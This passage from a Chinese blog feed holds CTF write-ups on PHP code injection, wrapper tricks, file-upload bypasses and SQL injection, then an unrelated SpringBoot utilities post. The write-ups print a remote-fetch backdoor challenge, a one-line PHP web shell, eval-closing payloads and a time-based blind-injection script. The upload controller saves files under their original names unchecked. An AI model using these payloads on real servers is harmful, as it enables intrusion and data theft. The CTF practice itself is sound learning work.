&lt;author@example.com&gt; |// | Your Name &lt;you@example.com&gt; |// +----------------------------------------------------------------------+//// $Id:$$a = isset($_POST['pass']) ? trim($_POST['pass']) : '';if ($a == '') &#123; echologin();&#125; else &#123; chkpass($a); helloowner($a); // 关键是这个函数&#125;function chkpass($a) &#123; if (stripos($_SERVER['HTTP_USER_AGENT'], md5($a)) === false) &#123; echofail(1); &#125; return true;&#125;function helloowner($a) &#123; $b = gencodeurl($a); $c = file_get_contents($b); //这里要求从某个链接的文件读取json字符串，包含f，d字段的json，而且f，d里必须是一段木马，木马格式见下 if ($c == false) &#123; echofail(2); &#125; $d = @json_decode($c, 1); if (!isset($d['f'])) &#123; echofail(3); &#125; $d['f']($d['d']); // 木马格式&#125;function gencodeurl($a) &#123; $e = md5(date("Y-m-d")); if (strlen($a) &gt; 40) &#123; $f = substr($a, 30, 5); $g = substr($a, 10, 10); &#125; else &#123; $f = 'good'; $g = 'web.com'; &#125; $b = 'http://' . $f . $g; return $b;&#125;function echofail($h) &#123; $i = 'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='; echo str_replace('%id%', $h, base64_decode($i)); exit;&#125;function echologin() &#123; $j = 'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'; echo base64_decode($j); exit;&#125; ?&gt; url方式，超过40个字符长度才可以进入1234567891011121314function gencodeurl($a) &#123;//url切分 $e = md5(date("Y-m-d")); if (strlen($a) &gt; 40) &#123;//如果长度&gt;40,$f = a[30:35],$g = a[10:20] $f = substr($a, 30, 5); $g = substr($a, 10, 10); &#125; else &#123; $f = 'good'; $g = 'web.com'; &#125; $b = 'http://' . $f . $g; return $b;&#125;// 传入字符串示例： http://aaa.com/a.phpccccccccccflag0aaaaaaaaa 下面是需要让 file_get_contents($b) 访问到木马json文件的内容是12345678&lt;?php $url = array( "f"=&gt;"system", "d"=&gt;"cat ../flag.php" ); $url = json_encode($url); echo $url; ?&gt; 构造成功之后是： {“f”:”system”,”d”:”cat ..\/flag.php”} bugku 系列变量1 http://123.206.87.240:8004/index1.php 查看源码123456789101112&lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; //正则匹配=&gt; /^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$/结尾 die("args error!"); &#125; eval("var_dump($$args);"); // 执行命令代码&#125;?&gt; 分析php的9大内置变量 $_POST [用于接收post提交的数据]$_GET [用于获取url地址栏的参数数据]$_FILES [用于文件就收的处理img 最常见]$_COOKIE [用于获取与setCookie()中的name 值]$_SESSION [用于存储session的值或获取session中的值]$_REQUEST [具有get,post的功能，但比较慢]$SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都$GLOBALS [一个包含了所有全局变量的数组]$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它] 得出令 args=GLOBALS 获得flag 本地包含套路比较多，内容丰富，值得记录 123456&lt;?php include "flag.php"; $a = @$_REQUEST['hello']; // 获取hello参数 eval( "var_dump($a);"); // var_dump()输出文件信息，需要绕过 show_source(__FILE__); ?&gt; 套路一 直接闭合var_dump hello=1);show_source(%27flag.php%27);var_dump(3http://123.206.87.240:8003/index.php?hello=1);print_r(file(&quot;./flag.php&quot;) 套路二 利用伪协议直接使用post来使用伪协议 http://120.24.86.145:8003/index.php?hello=1);include $_POST[‘f’];//在POST区域：f=php://filter/convert.base64-encode/resource=flag.php 套路三 直接来 ?hello=get_file_contents(‘flag.php’)?hello=file(‘flag.php’) 总之是字符串拼接玩出了花·····emm 备份是个好习惯 看到备份首先想到 .bak 文件 利用御剑工具扫描查看到 index.php ,猜测拿到index.php.bak 套路：1.) 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a2.) 利用==漏洞，数组无法被识别，都是null 特色$_SERVER[‘REQUEST_URI’] 用来获取url，可以当作get请求 速度要快这个故事告诉我们，这狗题目说快速，就说明手动是绝对不行了，需要走脚本了123456789101112import requestsimport base64url="http://120.24.86.145:8002/web6/"r=requests.session()headers=r.get(url).headers#因为flag在消息头里 str=base64.b64decode(headers['flag'])str=str.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的 flag = base64.b64decode(str.split(':')[1])#获得flag:后的值data=&#123;'margin':flag&#125;print (r.post(url,data).text)#post方法传上去 cookie欺骗靶机： http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= 铺面的字符串是无效的 发现在url中看到有base64编码的a2V5cy50eHQ= 访问后发现依然是无效的字符串 filenam顾名思义可以尝试伪协议，尝试无效 盲猜filename是可以读取文件，尝试filename赋值为 index.php 修改line的数据，发现可以读出一行的数据，写脚本读出index.php的完整代码 脚本： 1234567891011121314151617&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin') &#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list)) &#123; $fa = file($file); echo $fa[$line];&#125;?&gt; 得出结论发现，cookie为margin=margin可以给文件读取的数组赋值给keys.php，则keys.php可能是最终结果隐藏的地方 在burpsuite中更改cookie Cookie: margin=margin keys.php进行base64编码后传入给filename,得出结果web8 姿势整合了123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; 可以看到ac = f 就行了 套路1：看题目说txt 盲猜 flag.txt 直接拿到 伪协议ac = 5fn = php://inputpost数据 5可以获得]]></content>
  </entry>
  <entry>
    <title><![CDATA[ctf 杂录]]></title>
    <url>%2F2019%2F10%2F21%2FCTF-%E6%9D%82%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[各种姿势 php特性 $_SERVER[‘QUERY_STRING’]会获取到所有的文件后面传递的所有参数 php自身在解析请求时，会把+和.解析成下划线 数组与数字比较，永远大于数字 字符a在和整形进行弱类型比较时，会被强制转换成整形，其值为0php伪协议 file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 php://filter 经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用. php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。 用于直接读取用户的根目录的东西 url=php://filter/read=convert.base64-encode/resource=flag php://input php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。 使用时令参数赋值 php://input利用hackbar使用post 传递命令 &lt;?php system(‘ls’)?&gt; （列举所有文件） 服务器自身漏洞一句话木马 上传点存在白名单验证，从返回包可以得知其是apache2.2.15，apache2.2.15版本具有文件解析漏洞，可以把test.php.png当作php文件来解析执行，apache高版本不存在此漏洞，这里我们可以使用apache2.2.15的解析漏洞来绕过白名单限制 &lt;?php system($_POST[‘cmd’]); ?&gt;之后再利用post 发送数据， cmd = cat /flag 获取flag xss 漏洞xss介绍是由于动态网页的Web应用对用户提交请求参数未做充分的检查过滤，允许用户在提交的数据中掺入HTML代码（最主要的是“&gt;”、“&lt;”），然后未加编码地输出到第三方用户的浏览器，这些攻击者恶意提交代码会被受害用户的浏览器解释执行 域名解析到 文件里改就完事了 c:\windows\system32\drivers\etc\hosts前面是ip 后面是域名 php九大内置变量分析php的9大内置变量 $_POST [用于接收post提交的数据]$_GET [用于获取url地址栏的参数数据]$_FILES [用于文件就收的处理img 最常见]$_COOKIE [用于获取与setCookie()中的name 值]$_SESSION [用于存储session的值或获取session中的值]$_REQUEST [具有get,post的功能，但比较慢]$SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都$GLOBALS [一个包含了所有全局变量的数组]$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它] http系列referer (你从哪里来) HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。简而言之，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器藉此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站。 绕过问题大小写绕过 随便把content-type的内容进行大小写更改 Content-Type: mULtipart/form-data; boundary=—————————4827543632391 #修改大小写绕过 然后黄爆爆破尾缀 改成php+数字的格式，比如php1，php2啥的 靶机http://123.206.87.240:8002/web9/]]></content>
  </entry>
  <entry>
    <title><![CDATA[ctf攻防之sql注入]]></title>
    <url>%2F2019%2F10%2F15%2FCTF-SQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[基础sql注入 sql注入sql注入的基本原理 sql注入的主要原因来自sql查询的字符串拼接，例如我们正常输入1，那么呈现 1select * from table where id='1' 但是如果进行心机输入 1’ ,那么将会变成 ==》 1select * from table where id = '1'' 继续下去，因为两个 ‘ 的原因，那么则会产生sql syntax error ,所以需要产生注释后面的内容，我们需要#，因此输入 1’# 12345select * from table where id = '1'#' ===============&gt; 明显一些select * from table where id = '1' 注入分类整形注入 SELECT * FROM admin WHERE id = 1 and 1=1 字符型注入 SELECT * FROM admin WHERE id = ‘1’ and 1=1#’ 搜索型注入 SELECT * FROM admin WHERE id LIKE ‘%1%’ and ‘%’=’%’ sql注入常用基本操作————主要利用union select联合查询继续获取信息 获取数据库的基础信息 1’ union select database(),user()#database()返回当前使用的数据库名称user() 返回当前使用者的信息 获取操作系统等功能 1’ union select version(),@@version_compile_os#version() 获取当前数据库版本@@version_compile_os 获取当前操作系统@@version_compile_os 获取当前操作系统 获取数据库的表名 1’ union select table_names,table_schema from information_schema.tables where table_schema = ‘table name’ #数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库ps: 数据库会用一个information_schema.tables来记录表的信息 获取数据库的列名 1’ union select group_concat(column_name) from information_schema.columns where table_schema=database() 内联注释绕过 上述union select 可能会被拦截，因此使用注释绕过，用/！XX / 包裹，来实现绕过word=1%’ and 1=2 /!union/ /!select/ database(),user(),database() %23&amp;§number=5§转自： https://www.cnblogs.com/baimaoma/p/8608490.html sql约束攻击简单的来说，就是在sql中会因为一些空格来进行绕过，以账号密码注册为例子 默认后台有admin/password01 我们注册时候使用admin /password02 登陆的时候用admin/password02就可以正常的登陆 原因说明： 其实入库的时候会自动减去注册时尾部的空格，但是代码在写的时候却没有去掉空格，所以加上空格之后就不会查重，但是入了库就又重复了 sql盲注最简单的注入在于，无论你去注入什么，或者搜索或者选择都是会有相应的显示的，但是还有一部分的盲注是没有提示的，你无法得知自己是否sql注入成功，所以插入sql中的sleep（），get_lock()等系列函数，通过时间延迟来判断是否注入成功，以为盲注全靠猜，因此需要脚本来实现盲注 。 盲注分类Time盲注1SELECT * FROM admin WHERE id = 1 AND (SELECTif((SELECT substr(table_name,1,1) FROM users limit 0,1)=&apos;e&apos;,sleep(10),null)) •Bool盲注1SELECT * FROM admin WHERE id = 1 and ascii(substr((SELECT database()),1,1))&gt;99 ctf盲注代码：靶机： http://114.55.36.69:8007/注入猜测： http://114.55.36.69:8007/article.php?id=1&#39; and sleep(5) %23123456789101112131415161718#coding=utf8import requestsimport timedata = ''url = "http://114.55.36.69:8007/article.php?id=1'"for i in range(47): for c in range(32,127): url_req = url + " and if(ascii(substr((content),&#123;0&#125;,1))=&#123;1&#125;,get_lock('test',3),1)%23".format(i+1,str(c)) # 盲注猜测 print(url_req) start_time = time.time() res = requests.get(url_req) # 请求 end_time = time.time() if (end_time - start_time) &gt; 2.5: # 时间超过3秒说明注入成功，计入data data += chr(c) print(data) break;print('data:',data) # 输出结果 大佬帖子： https://www.cesafe.com/3993.html sqlmap感受了一哈，牛逼嗷 sqlmap-postpost的特殊一些，所有会把用burpsuite导出一份txt文件用于进行注入 判断是什么注入类型，是什么类型的数据库 python sqlmap.py -r test\post.txt 通过加后缀 –dbs 可以看到数据库的版本等更多信息 python sqlmap.py -r test\post.txt –dbs 通过后缀 -D 指定具体数据库， 利用后缀 –table 可以看到具体数据库的具体表名 python sqlmap.py -r test\post.txt -D skctf_flag –tables 通过后缀 -T 进一步指定某表的具体的列名 python sqlmap.py -r test\post.txt -D skctf_flag -T fl4g –columns 通过后缀 -C 具体指定具体的一列 python sqlmap.py -r test\post.txt -D skctf_flag -T fl4g -C “skctf_flag” –dump 通过后缀 –search 查找字段 python sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot 一些常用配置【持续更新】]]></title>
    <url>%2F2019%2F08%2F07%2FSpringboot%E5%90%84%E7%B1%BB%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Springboot 一些常用配置 工具类ID生成器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package com.obox.obox.Utils;import javax.xml.crypto.Data;import java.util.Calendar;import java.util.Date;import java.util.UUID;/** * * 各类id生成工具 */public class IdUtil &#123; /** * 生成用户ID * @return */ public static String Uid ()&#123; String uid = "U" + UUID.randomUUID().toString().hashCode(); return uid ; &#125; /** * 生成商家ID * @return */ public static String Bid()&#123; String bid = "B" + UUID.randomUUID().toString().hashCode() ; return bid ; &#125; /** * 生成商品ID * @return */ public static String Gid()&#123; String gid = "G" + UUID.randomUUID().toString().hashCode() ; return gid ; &#125; /** * 生成订单ID * @return */ public static String Olid()&#123; int hashCodeV = UUID.randomUUID().toString().hashCode(); if (hashCodeV &lt; 0)&#123; hashCodeV = - hashCodeV ; &#125; return "OL"+ hashCodeV; &#125; /** * 生成红包ID * @return */ public static String Cid()&#123; String cid = "C" + UUID.randomUUID().toString().hashCode() ; return cid ; &#125; /** * 生成轮播图ID * @return */ public static String Sid()&#123; String sid = "S" + UUID.randomUUID().toString().hashCode() ; return sid ; &#125; /** * 生成主界面小图标ID * @return */ public static String Hid()&#123; String hid = "H" + UUID.randomUUID().toString().hashCode() ; return hid ; &#125; /** * 生成二维码小图标 * @return */ public static String Qrid()&#123; int hashCodeV = UUID.randomUUID().toString().hashCode(); if (hashCodeV &lt; 0)&#123; hashCodeV = - hashCodeV ; &#125; return "OR"+ hashCodeV; &#125;&#125; 图片处理器（只留下图片名）1234567891011121314151617181920212223242526package com.obox.obox.Utils;import java.io.File;import java.util.ArrayList;import java.util.List;public class PicUtils &#123; public static List&lt;String&gt; CutPicStr(String str)&#123; File file = new File(str); File[] fs = file.listFiles(); List&lt;String&gt; paths = new ArrayList&lt;&gt;() ; for(File f:fs)&#123; if(!f.isDirectory()) &#123; paths.add(f.getName()) ; &#125; &#125; return paths; &#125;&#125; 时间格式化器12345678910111213141516171819202122232425package com.obox.obox.Utils;import java.text.SimpleDateFormat;import java.util.Calendar;import java.util.Date;public class TimeUtil &#123; public static String getTime()&#123; Calendar calendar = Calendar.getInstance(); Date date = calendar.getTime() ; SimpleDateFormat sdf =new SimpleDateFormat("yyyy-MM-dd HH:mm:ss" ); String s = sdf.format(date) ; return s ; &#125; public static String getTime(Date date)&#123; SimpleDateFormat sdf =new SimpleDateFormat("yyyy-MM-dd HH:mm:ss" ); String s = sdf.format(date) ; return s ; &#125;&#125; 二维码生成器12345678910111213141516171819202122232425262728package com.obox.obox.service.QR;import com.alibaba.fastjson.JSON;/** * * 二维码生成服务 */public class QRService &#123; private static String URL = "http://qr.liantu.com/api.php?text=" ; /** * 二维码图片链接 * @param id * @return */ public static String GenerateQR(String id)&#123; String OR_Code_Url = URL + id ; return OR_Code_Url ; &#125;&#125; 服务使用文件上传123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214package com.obox.obox.controller.file;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.obox.obox.Utils.IdUtil;import com.obox.obox.model.token.NoToken;import org.springframework.web.bind.annotation.*;import org.springframework.web.multipart.MultipartFile;import javax.servlet.ServletInputStream;import javax.servlet.http.HttpServletRequest;import javax.swing.filechooser.FileView;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.nio.file.StandardCopyOption;import java.text.SimpleDateFormat;import java.util.*;@RestController@RequestMapping(value = "/file")public class UploadFileController &#123; private final String ip = "http://118.31.120.92/wechat/"; private final String spath = "/root/local/user/obox/pic/" ; /** * 用户头像上传 * @param file * @return */ @PostMapping("uploadusericon") public Object UserIconUpload(@RequestParam(value = "file",required = true) MultipartFile file) &#123; String cata = "user/usericon/" + IdUtil.Uid() + "/" ; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125; /** * 商品信息上传 * @param file * @return */ @PostMapping("uploadgoodspic") public Object GoodspicUpload(@RequestParam(value = "file",required = true) MultipartFile file) &#123; String cata = "business/goods/" + IdUtil.Gid() + "/"; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125; /** * 商品图标上传 * @param file * @return */ @PostMapping("uploadgoodsicon") public Object GoodsIconUpload(@RequestParam(value = "file",required = true) MultipartFile file) &#123; String cata = "business/goods/" + IdUtil.Gid() + "/"; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125; /** * 商家背景上传 * @param file * @return */ @PostMapping("uploadbusinesspic") public Object BusinessPicUpload(@RequestParam(value = "file",required = true) MultipartFile file)&#123; String cata = "business/businessman/" + IdUtil.Bid() + "/"; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125; /** * 商家logo上传 * @param file * @return */ @PostMapping("uploadbusinesslogo") public Object BusinessLogoUpload(@RequestParam(value = "file",required = true) MultipartFile file)&#123; String cata = "business/businessman/" + IdUtil.Bid() + "/"; String docname = file.getOriginalFilename() ; if (Objects.isNull(file) || file.isEmpty()) &#123; return "文件为空，请重新上传"; &#125; try &#123; byte[] bytes = file.getBytes(); Path path = Paths.get(spath + cata + docname); //如果没有files文件夹，则创建 if (!Files.isWritable(path)) &#123; Files.createDirectories(Paths.get(spath+cata)); &#125; //文件写入指定路径 Files.write(path, bytes); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; Map&lt;String, Object&gt; url = new HashMap&lt;&gt;() ; url.put("url",ip+cata+docname) ; return url ; &#125;&#125; 地表最强pom =&gt; 专治疑难杂症123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.6.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.obox&lt;/groupId&gt; &lt;artifactId&gt;obox&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;obox&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;!-- &lt;dependency&gt;--&gt;&lt;!-- &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;--&gt;&lt;!-- &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;--&gt;&lt;!-- &lt;scope&gt;test&lt;/scope&gt;--&gt;&lt;!-- &lt;/dependency&gt;--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.33&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 微信支付 --&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.httpcomponents/httpclient --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt; &lt;version&gt;4.5.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.21&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt; &lt;version&gt;1.7.21&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Redis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- RestTemplete --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt; &lt;version&gt;4.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.bouncycastle&lt;/groupId&gt; &lt;artifactId&gt;bcprov-jdk15on&lt;/artifactId&gt; &lt;version&gt;1.57&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;!-- 微信支付--&gt; &lt;licenses&gt; &lt;license&gt; &lt;name&gt;The BSD 3-Clause License&lt;/name&gt; &lt;url&gt;https://opensource.org/licenses/BSD-3-Clause&lt;/url&gt; &lt;distribution&gt;repo&lt;/distribution&gt; &lt;/license&gt; &lt;/licenses&gt; &lt;scm&gt; &lt;url&gt;&lt;/url&gt; &lt;connection&gt;&lt;/connection&gt; &lt;developerConnection&gt;&lt;/developerConnection&gt; &lt;/scm&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; 